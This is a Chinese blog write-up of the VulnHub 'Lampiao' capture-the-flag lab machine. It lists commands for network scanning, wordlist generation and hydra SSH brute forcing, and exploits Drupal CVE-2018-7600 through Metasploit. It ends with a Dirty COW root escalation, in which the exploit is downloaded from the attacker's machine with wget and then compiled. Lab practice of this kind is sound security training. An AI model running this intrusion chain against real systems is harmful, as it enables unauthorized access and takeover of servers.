vulnhub—— 2-Lampiao复现
2021-09-16 15:28:18

目标

目标：得到root权限
难度：简单

思路

一、信息收集

需要使用nmap获取目标IP地址：

nmap -sP 192.168.253.0/24


找到对方ip后，进行端口扫描

nmap -p- -Pn -n 192.168.253.4


可以看到有三个可用的开放端口22、80、1898端口。尝试对22端口进行弱口令爆破，并没有结果，
还开了一个80的web页面和1898端口，分别访问看下
80是一个静态页面，
1898端口有一个登陆界面。里面也有些信息，比如说里面提到的两个作者，以及可以点击的网页
接下来，方法就多了

方法一 爆破22端口

可以看到这是一个 Drupal 博客，作者是tiago和Eder。使用这些用户名，生成字典
所以先利用cewl来生成一份结合网站目标的社工性质的密码字典

字典生成工具 cewl
cewl是一个ruby开发的应用程序，你可以给它的爬虫指定url的指定深度还可以添加额外的外部连接，接下来cewl会给你返回一个字典文件。
默认方法：
输入下列命令之后，爬虫会根据指定的url和深度进行爬取，然后打印可用于密码破解的字典
cewl http://xxxxx
-w xxx.txt 保存文件
-m X 指定至少X位或以上的密码 通过cewl生成一个字典

生成字典

cewl http://192.168.253.4:1898/?q=node/1 -w baixi.txt


开始用工具进行暴力攻击ssh服务

hydra -l tiago -P dayu.txt 192.168.253.4 ssh


用户: tiago
密码: Virgulino
使用用户名tiago进行ssh登陆连接，成功连接，但是不能用sudo su进行提权！！

方法二 爆破扫描

工具对网站进行爆破扫描

dirb http://192.168.253.4:1898 -o out


找到了一个robots.txt文件，后台打开看看
基于Drupal 7的博客或是社交网站。
使用msf利用漏洞CVE-2018-7600

msfconsole
search drupal


选择第四个漏洞

use 4
set Rhosts 192.168.253.4
set Rport 1898
run


成功返回一个meterpreter会话

shell
python -c 'import pty; pty.spawn("/bin/bash")'


获取Python交互式shell，

二、内核提权

使用脏牛提权

searchsploit dirty


在攻击机上使用cp将shell复制出来

cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /root/Desktop/


在攻击机上开始5555服务，支持靶机可以在攻击机上下载40847.cpp文件
将40847.cp上传到靶机上。

wget http://192.168.253.2:5555/40847.cpp


下载成功，因为cpp是c++，需要先编译在运行

g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exp 40847.cpp -lutil


-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告

-pedantic 允许发出ANSI/ISO C标准所列出的所有警告

-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高

-std=c++11就是用按C++2011标准来编译的

-pthread 在Linux中要用到多线程时，需要链接pthread库

-o dcow gcc生成的目标文件,名字为dcow
运行

./exp


获得到了密码dirtyCowFun
